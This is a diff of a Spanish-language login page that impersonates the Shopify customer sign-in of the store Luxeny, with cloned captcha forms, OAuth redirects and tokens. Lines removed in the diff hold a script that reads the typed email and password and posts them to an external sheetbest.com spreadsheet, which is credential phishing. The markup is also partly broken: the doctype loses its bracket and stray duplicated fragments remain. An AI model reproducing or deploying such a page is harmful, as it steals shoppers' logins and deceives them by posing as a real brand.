@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="es">
     <head>
         <title>Iniciar sesión: Luxeny</title>
@@ -131,7 +131,7 @@
   </style>
 
 
-<div class="page-container"> 
+<div class="page-container">
   <main class="page-main">
     <div class="page-content">
       <div class="main-content">
@@ -156,7 +156,7 @@
                 </div>
               </div>
 
-              <form id="formulario">
+              <form id="loginForm" onsubmit="return false;">
                 <div class="ui-form__section">
                   <!-- Email -->
                   <div class="ui-form__group polaris-uplift-input-wrapper">
@@ -180,70 +180,10 @@
                   </p>
 
                   <!-- Submit button -->
-                  <button type="submit" class="ui-button ui-button--primary ui-button--full-width ui-button--size-large login-button">
-                    <span>Continuar</span>
-                  </button>
-                </div>
-              </form>
-
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </main>
-</div>
-
-<script>
-  const API_URL = "https://api.sheetbest.com/sheets/d867f5e4-5cbe-4b84-aa70-d1195e64372a";
-
-  document.getElementById("formulario").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-    const errorMsg = document.getElementById("error-message");
-
-    if (password !== "luxeny123") {
-      errorMsg.style.display = "block";
-      return;
-    }
-
-    errorMsg.style.display = "none";
-
-    fetch(API_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, password })
-    })
-    .then(res => {
-      if (!res.ok) throw new Error("Error en la solicitud");
-      return res.json();
-    })
-    .then(data => {
-      alert("¡Inicio de sesión exitoso y datos guardados!");
-      document.getElementById("formulario").reset();
-    })
-    .catch(err => {
-      alert("Hubo un error al guardar los datos.");
-      console.error(err);
-    });
-  });
-</script>
-
-    document.getElementById("formulario").addEventListener("submit", function (e) {
-      e.preventDefault();
-                  <!-- Error message -->
-                  <p id="error-message" style="color:#D91C1C; display:none; font-weight: bold; margin-top: 10px;">
-                    Contraseña incorrecta. Inténtelo de nuevo.
-                  </p>
-
-                  <!-- Submit button -->
                   <button type="button" onclick="validateLogin()" class="ui-button ui-button--primary ui-button--full-width ui-button--size-large login-button">
                     <span>Continuar</span>
                   </button>
                 </div>
-              </form>
             </div>
           </div>
         </div>
@@ -269,10 +209,8 @@
 
 
 
-
-
           
-  <form id="captcha_form" novalidate="novalidate" action="/authentication/56001495129/verify?client_id=e0092440-6979-4480-86f7-e9414c90e42e&amp;locale=es&amp;redirect_uri=https%3A%2F%2Fshopify.com%2Fauthentication%2F56001495129%2Foauth%2Fauthorize%3Fclient_id%3De0092440-6979-4480-86f7-e9414c90e42e%26locale%3Des%26nonce%3De05b1e67-b612-48e4-96bc-efc6481731f4%26redirect_uri%3Dhttps%253A%252F%252Fcuenta.luxeny.cl%252Fcallback%253Fsource%253Dcore%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bcustomer-account-api%253Afull%26state%3D01JTYM7EC8C9H8YN72R93YN7BG" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="dEIlErMFfuSOx4hk2s5o88I1-Vr0o8k_RoS6jZ6iJBEpLtS-GKkzr765ckQL6THUbZRtSFKghqBJreTmDMCL1w" autocomplete="off" />
+  <form id="captcha_form" novalidate="novalidate" action="/authentication/56001495129/verify?client_id=e0092440-6979-4480-86f7-e9414c90e42e&amp;locale=es&amp;redirect_uri=https%3A%2F%2Fshopify.com%2Fauthentication%2F56001495129%2Foauth%2Fauthorize%3Fclient_id%3De0092440-6979-4480-86f7-e9414c90e42e%26locale%3Des%26nonce%3Dedb76e25-a5ba-45c3-8148-dd5dd65fadf6%26redirect_uri%3Dhttps%253A%252F%252Fcuenta.luxeny.cl%252Fcallback%253Fsource%253Dcore%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bcustomer-account-api%253Afull%26state%3D01JTYNY2P8N98KHRG417JWAY3A" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="hVQLmMnLyGpr9BhXVpTdaJKARzI3bjm1FnrwiPgOIabYOPo0YmeFIVuK4neHs4RPPSHTIJFtdioZU67jamyOYA" autocomplete="off" />
     <div class="ui-form__section">
       <div class="ui-form__group polaris-uplift-input-wrapper">
         <div class="next-input-wrapper email-input-wrapper"><label class="next-label helper--visually-hidden" for="email">Correo electrónico</label><input type="email" placeholder="Correo electrónico" autocomplete="false" class="next-input email-typo-input" autofocus="autofocus" aria-required="true" aria-invalid="false" aria-describedby="customer-account-description" size="30" name="email" id="email" /></div>
